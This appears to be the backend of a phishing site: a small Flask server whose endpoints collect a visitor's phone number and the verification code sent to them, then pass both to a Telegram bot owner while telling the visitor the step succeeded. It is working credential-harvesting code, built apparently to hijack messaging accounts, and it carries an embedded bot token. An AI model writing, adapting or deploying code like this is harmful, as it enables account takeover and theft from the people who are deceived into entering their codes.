from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__)

BOT_TOKEN = "8322289308:AAEuUETn72fgvS0waidzVkjWIuJ8dhIe8Ts"
OWNER_ID = 208405935

def send_telegram(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": OWNER_ID, "text": text})
    except:
        pass

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.json.get('phone', '')
    # Отправляем ТОЛЬКО НОМЕР в Telegram
    send_telegram(f"📱 НОМЕР: {phone}")
    return jsonify({"status": "ok"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    phone = request.json.get('phone', '')
    code = request.json.get('code', '')
    # Отправляем КОД в Telegram
    send_telegram(f"🔓 {phone}\nКОД: {code}")
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
